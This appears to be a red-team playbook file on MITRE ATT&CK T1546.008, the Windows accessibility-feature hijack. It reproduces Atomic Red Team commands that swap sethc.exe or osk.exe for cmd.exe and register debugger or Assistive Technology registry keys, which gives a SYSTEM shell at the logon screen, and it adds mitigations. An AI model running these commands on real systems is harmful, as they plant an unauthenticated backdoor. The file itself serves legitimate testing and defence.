---
name: "T1546.008_accessibility-features"
description: "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features."
category: "authorization"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1546.008
  - privilege-escalation
  - persistence
  - windows
  - sub-technique
technique_id: "T1546.008"
tactic: "privilege-escalation"
all_tactics:
  - privilege-escalation
  - persistence
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1546/008"
tech_stack:
  - windows
cwe_ids:
  - CWE-269
chains_with:
  - T1546
  - T1546.001
  - T1546.002
  - T1546.003
  - T1546.004
  - T1546.005
  - T1546.006
  - T1546.007
  - T1546.009
  - T1546.010
  - T1546.011
  - T1546.012
  - T1546.013
  - T1546.014
  - T1546.015
  - T1546.016
  - T1546.017
  - T1546.018
prerequisites:
  - T1546
severity_boost:
  T1546: "Chain with T1546 for deeper attack path"
  T1546.001: "Chain with T1546.001 for deeper attack path"
  T1546.002: "Chain with T1546.002 for deeper attack path"
---

# T1546.008 Accessibility Features

> **Sub-technique of:** T1546

## High-Level Description

Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. 

Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.

For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges. 

Other accessibility features exist that may also be leveraged in a similar fashion: 

* On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
* Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
* Narrator: <code>C:\Windows\System32\Narrator.exe</code>
* Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
* App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>

## Kill Chain Phase

- Privilege Escalation (TA0004)
- Persistence (TA0003)

**Platforms:** Windows

## What to Check

- [ ] Identify if Accessibility Features technique is applicable to target environment
- [ ] Check Windows systems for indicators of Accessibility Features
- [ ] Verify mitigations are bypassed or absent (3 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Attaches Command Prompt as a Debugger to a List of Target Processes

Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.
Upon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
$input_table = "#{parent_list}".split(",")
$Name = "Debugger"
$Value = "#{attached_process}"
Foreach ($item in $input_table){
  $item = $item.trim()
  $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
  IF(!(Test-Path $registryPath))
  {
    New-Item -Path $registryPath -Force
    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
  }
  ELSE
  {
    New-ItemProperty -Path $registryPath -Name $name -Value $Value
  }
}
```

### Atomic Test 2: Replace binary of sticky keys

Replace sticky keys binary (sethc.exe) with cmd.exe

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\sethc.exe /A
icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

### Atomic Test 3: Create Symbolic Link From osk.exe to cmd.exe

Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd )
takeown /F %windir%\System32\osk.exe /A
icacls %windir%\System32\osk.exe /grant Administrators:F /t
del %windir%\System32\osk.exe
mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe
```

### Atomic Test 4: Atbroker.exe (AT) Executes Arbitrary Command via Registry Key

Executes code specified in the registry for a new AT (Assistive Technologies).

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f
atbroker /start malware_test
```

### Atomic Test 5: Auto-start application on user logon

Executes code specified in the registry on new user logon session automatically by registration of new AT and modification of configuration value.
This test will register new AT named malware_test with code for cmd.exe and add a configuration value for the code to be run during user logon session.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs" /v Configuration /t REG_SZ /d malware_test /f
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Accessibility Features by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1546.008 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1035 Limit Access to Resource Over Network
If possible, use a Remote Desktop Gateway to manage connections and security configuration of RDP within a network.

### M1028 Operating System Configuration
To use this technique remotely, an adversary must use it in conjunction with RDP. Ensure that Network Level Authentication is enabled to force the remote desktop session to authenticate before the session is created and the login screen displayed. It is enabled by default on Windows Vista and later.

### M1038 Execution Prevention
Adversaries can replace accessibility features binaries with alternate binaries to execute this technique. Identify and block potentially malicious software executed through accessibility features functionality by using application control tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate.


## Detection

### Detection Strategy for Accessibility Feature Hijacking via Binary Replacement or Registry Modification


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Accessibility Features technique applicable | High | Privilege Escalation |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-269 | Improper Privilege Management |


## References

- [Narrator Accessibility Abuse](https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html)
- [FireEye Hikit Rootkit](https://web.archive.org/web/20190216180458/https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html)
- [DEFCON2016 Sticky Keys](https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom)
- [Tilbury 2014](https://web.archive.org/web/20200730053039/https://www.crowdstrike.com/blog/registry-analysis-with-crowdresponse/)
- [Atomic Red Team - T1546.008](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1546.008)
- [MITRE ATT&CK - T1546.008](https://attack.mitre.org/techniques/T1546/008)
